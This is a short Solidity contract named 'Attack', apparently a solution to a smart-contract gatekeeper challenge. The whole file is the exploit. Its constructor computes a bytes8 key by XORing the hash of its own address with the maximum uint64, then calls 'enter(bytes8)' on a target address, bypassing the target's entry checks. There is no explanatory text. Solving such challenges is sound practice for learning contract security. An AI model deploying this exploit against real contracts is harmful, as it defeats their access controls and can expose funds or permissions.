// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

contract Attack {

    constructor(address _addr) {
        bytes8 _key = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ type(uint64).max);
        bytes memory payload = abi.encodeWithSignature("enter(bytes8)", _key);
        (bool success,) = _addr.call(payload);
    }
}